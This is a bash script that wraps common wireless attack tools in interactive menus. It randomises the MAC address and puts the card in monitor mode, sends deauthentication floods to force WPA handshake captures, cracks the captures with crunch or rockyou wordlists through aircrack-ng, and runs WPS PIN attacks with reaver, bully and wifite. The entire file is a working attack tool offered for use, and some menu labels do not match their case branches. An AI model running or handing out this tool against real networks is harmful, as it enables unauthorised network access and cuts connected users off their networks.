#!/bin/bash

if [ $EUID -ne 0 ]; then
    sudo  "$0" "$@"
    exit $1
fi

pip install -r requirements.txt

clear

echo "This script is for capturing and bruteforcing a wifi handshake capture."

echo "Select an interface:"

interfaces=`ip link | awk -F: '$0 !~ "lo|vir|^[^0-9]"{print $2a;getline}'`

select option in $interfaces; do
	echo "Enabling monitor mode"
	sleep 1
	sudo ifconfig $option down
	sudo macchanger -r $option
	sudo macchanger -s $option
	sleep 1
	sudo iwconfig $option mode monitor
	sudo ifconfig $option up

clear

Attack_Options="Regex_Scan Regex_Capture Cap_BruteForce WPS_attacks Change_Interface Exit"
    select ption in $Attack_Options; do 
    case $ption in

	Regex_Scan)
	clear
	read -p "Time to scan in secs: " time
	echo "scaning..."
	sleep 1
	nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
	timeout $time xterm -hold -e sudo airodump-ng $option
	;;


    Regex_Capture)
		clear
		read -p "Time to scan in secs: " time 
		echo "Copy BSSID, station mac and channel from scan, press space to pause scan"
		sleep 1
		nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
		timeout $time nohup xterm -hold -e sudo airodump-ng -M -W $option > /dev/null 2>&1 &
		read -p "BSSID to capture from: " BSSID
		read -p "Channel: " CHANNEL
	    read -p "Station to deauth: " STATION
		read -p "Name for capture file: " FILE
		nohup xterm -hold -e sudo airodump-ng -c$CHANNEL -w $FILE -d $BSSID $option > /dev/null 2>&1 &
		xterm -hold -e sudo aireplay-ng --deauth 0 -a $BSSID -c $STATION $option --ignore-negative-one
	;;



	Cap_BruteForce)
		clear
		echo "Bruteforcing a handshake capture with aircrack-ng"
		Cracking_Options="Custom_Charset Crunch_Charset Wordlist_Brute Main_Menu"

		select cracking_option in $Cracking_Options; do
			case $cracking_option in
				CustomCharset)
				clear

				echo "Make custom charsets with crunch"
				echo "Leave input blank and press enter for an uneeded option"
				read -p "Min length: " min
				read -p "Max length: " max
				echo "Crunch options:"
				echo "@=lower case letters ; ,=capital letters ; %=numbers ; ^=symbols"
				echo "Example options: @,%^possible password"
				read -p "Enter crunch options and possible password: " possible
				read -p "Enter own characters for custom charset: " custom
				read -p "Enter path of handshake capture: " path
				read -p "SSID: " ssid

				xterm -hold -e sudo crunch $min $max -t $possible $custom | sudo aircrack-ng -w - $path -e $ssid
                ;;

				Crunch_Charset)
				clear
				echo "Use crunch charsets"
				read -p "Min length: " min
				read -p "Max length: " max
				echo "Crunch options:"
                echo "@=lower case letters ; ,=capital letters ; %=numbers ; ^=symbols"
                echo "Example options: @,%^possible password"
				read -p "Enter crunch options and possible password: " possible
				read -p "Enter path of handshake capture: " path
				read -p "SSID: " ssid
				xterm -hold -e sudo crunch $min $max -t $possible -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space | aircrack-ng -w - $path -e $ssid
                ;;

				Word_listBrute)
				clear
				echo "Bruteforce with wordlist"
				read -p "Enter path of handshake capture " path
				xterm -hold -e sudo aircrack-ng $path -w /usr/share/wordlists/rockyou.txt 
		        ;;

				Main_Menu)
		        clear
                break
	            ;;
	
		        *)
		        echo "Invalid character"
		        sleep 1
                clear
                ;;

	    	   	esac
	            done   
                ;;

	WPS_attacks)
		clear
	    wps_options="Scan Pixie_Dust Null_Pin Wifite_Brute Bully_Brute Reaver_Brute_without_pixie Main_Menu"   
        echo "Select an attack option"
		select wps_option in $wps_options; do
        case $wps_option in
            
           Scan) 
           clear
		   read -p "Amount of time to scan for in secs: " time
           echo "scanning..."
           sleep 1
		   nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
           timeout $time xterm -hold -e sudo wash -i $option > /dev/null 2>&1 &
           ;;
        
           Pixie_Dust)
           clear
		   echo "For bruteforcing to stay stable, it recommended to associate with the target network"
		   read -p "Amount of time to scan for in secs: " time
		   nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
		   timeout $time nohup xterm -hold -e sudo wash -i $option > /dev/null 2>&1 &
           echo "close xterm before entering essid"
		   read -p "enter bssid: " bssid
		   read -p "enter essid: " essid
		   read -p "Set delay in secs" delay
		   sudo ifconfig $option down 
		   sudo macchanger -p $option
		   sudo ifconfig $option up
		   sudo macchanger -s $option
		   iwlist $option channel | grep Current
		   read -p "Set same channel as target network: " channel
		   sudo iwconfig $option channel $channel
		   read -p "network card mac: " mac 
		   sudo aireplay-ng -1 0 -e $essid -a $bssid -h $mac $option
		   echo "Association complete, starting bruteforce..."
		   sleep 1
		   xterm -hold -e sudo reaver -c $channel -i $option -b $bssid -d$delay -vv -K 1
           ;;
    
		   Null_Pin)
		   clear
		   echo "Null pin attack is bruteforcing with no pin"
		   read -p "Amount of time to scan for in secs: " time
           echo "scanning..."
           sleep 1
		   nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
           timeout $time xterm -hold -e sudo wash -i $option > /dev/null 2>&1 &
		   iwlist $option channel | grep Current
		   echo "close xterm before entering bssid"
		   read -p "enter channel: " channel
		   read -p "enter bssid:" bssid 
		   
	       xterm -hold -e sudo reaver -c $channel -i $option -b $bssid -p "" -N
           ;;

		   Wifite_Brute)
		   clear
		   xterm -hold -e sudo wifite -i $option -mac --wps
		   ;;

		   Bully_Brute)		   
           clear
		   read -p "Amount of time to scan for in secs: " time
		   nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
		   timeout $time nohup xterm -hold -e sudo wash -i $option > /dev/null 2>&1 &
           echo "close xterm before entering essid"
		   read -p "enter bssid: " bssid
		   read -p "enter essid: " essid

		   xterm -hold -e sudo bully $option -b $bssid -e $essid
           ;;

		   Reaver_Brute_without_pixie)
		   clear
		   read -p "Amount of time to scan for in secs: " time
		   nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
		   timeout $time nohup xterm -hold -e sudo wash -i $option > /dev/null 2>&1 &
		   read -p "enter bssid: " bssid
		   read -p "enter essid: " essid
		   read -p "enter delay in secs: " delay

		   xterm -hold -e sudo reaver -i $option -b $bssid -e $essid -d$delay 
           ;;

           Main_Menu)
		   clear
		   break
		   ;;

		   *)
           clear
           echo "invalid character"
           ;;

        esac
        done
        ;;

	Change_Interface)
	clear
	break
	;;

	Exit)
	clear
	exit
	;;
	
esac
done
done
